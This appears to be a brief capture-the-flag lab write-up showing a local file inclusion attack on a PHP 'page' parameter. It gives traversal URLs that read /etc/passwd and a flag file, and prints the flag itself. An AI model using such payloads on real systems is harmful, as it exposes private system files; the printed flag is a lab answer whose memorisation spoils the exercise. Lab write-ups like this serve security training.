We found the url with a parameter with php, that can be at `/var/www/html/relax.php`
We can try the classic LFI (`http://10.10.107.77/?page=../../../../etc/passwd`):
![](Screenshots/Pasted%20image%2020251115002220.png)

Now we can find the flag (`http://10.10.107.77/?page=../../../../flag.txt`): 
`flag{e4478e0eab69bd642b8238765dcb7d18}`
